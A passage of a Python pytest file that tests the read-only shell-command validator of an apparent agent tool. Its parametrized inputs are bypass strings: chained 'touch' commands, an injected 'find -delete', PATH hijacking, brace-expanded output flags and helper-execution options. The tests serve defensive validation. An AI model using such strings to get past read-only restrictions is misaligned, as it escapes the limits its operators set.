    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is False


@pytest.mark.parametrize(
    "command",
    [
        "tar -tf archive.tar",
        "tar --list --file archive.tar",
        "unzip -l archive.zip",
        "LANG=C cat file",
    ],
)
def test_archive_listing_and_inert_environment_remain_readonly(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is True


def test_deep_transparent_wrapper_nesting_fails_closed():
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command("env " * 100 + "cat file")[0] is False


@pytest.mark.parametrize(
    "command",
    [
        "find . $(printf -- -delete)",
        'find "$ARG"',
        'sort "$OP" file',
        'sed -n 1p "$OP" file',
        'env sort "$OP" file',
        'ssh "$HOST" cat file',
        'ssh host "cat $PAYLOAD"',
        "sort $FILES",
    ],
)
def test_dynamic_argv_cannot_choose_a_write_or_execution_option(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is False


@pytest.mark.parametrize(
    "command",
    [
        'find "./$DIR" -type f',
        'find . -name "$PATTERN"',
        'sort -- "$FILE"',
        'rg -- "$PATTERN" "$FILE"',
        'cat "$FILE"',
        "find . -name '$LITERAL'",
    ],
)
def test_provably_positional_dynamic_values_remain_available(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is True


def test_unquoted_brace_expansion_can_also_choose_a_write_option():
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command("sort {-oout.txt,file} input")[0] is False


@pytest.mark.parametrize(
    "command",
    [
        "if PATH=/untrusted ls; then echo x; fi",
        "for PATH in /untrusted; do ls; done",
        "printf -v PATH /untrusted; ls",
        "read PATH; ls",
    ],
)
def test_control_flow_and_builtins_cannot_replace_executable_resolution(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is False


def test_readonly_printf_can_still_render_quoted_data():
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command('printf "%s\\n" "$LINE"')[0] is True


@pytest.mark.parametrize(
    "command",
    [
        "echo '\\'; touch out.txt",
        "echo # '\ntouch out.txt\n# '",
        "docker compose config -oout.txt",
        "docker compose config --out=out.txt",
    ],
)
def test_single_quoted_backslash_comments_and_attached_cli_outputs_fail_closed(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is False


@pytest.mark.parametrize("command", ["echo '\\'; touch out.txt", "docker compose config -oout.txt"])
async def test_quoted_and_cli_output_bypasses_never_spawn_or_hit_read_cache(command):
    with (
        patch("victor.tools.shell_command_cache.get_shell_cache") as cached,
        patch(
            "victor.tools.subprocess_executor.run_managed_process", new_callable=AsyncMock
        ) as run,
    ):
        result = await shell(cmd=command, readonly=True)
        assert result["success"] is False
        cached.assert_not_called()
        run.assert_not_awaited()


def test_comment_parenthesis_cannot_end_a_substitution_before_its_effects():
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command('echo "$(printf safe # )\ntouch out.txt\n)"')[0] is False
    assert _validate_readonly_command('echo "$(printf safe # )\nprintf more\n)"')[0] is True


@pytest.mark.parametrize(
    "command",
    [
        'rg "$FLAGS" pattern file',
        "FLAGS=--pre=helper; rg $FLAGS pattern file",
        "ffmpeg -i input.mp4 -vf 'metadata=mode=print:file=out.txt' -f image2pipe -",
        "ffmpeg -f lavfi -i 'color,metadata=mode=print:file=out.txt' -f image2pipe -",
        "ffprobe -report -show_format input.mp4",
        "tesseract input.png stdout -c debug_file=out.txt",
        "tesseract input.png stdout custom-config",
        "pdftocairo -png input.pdf -",
    ],
)
def test_media_and_binary_helper_programs_require_execution(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is False
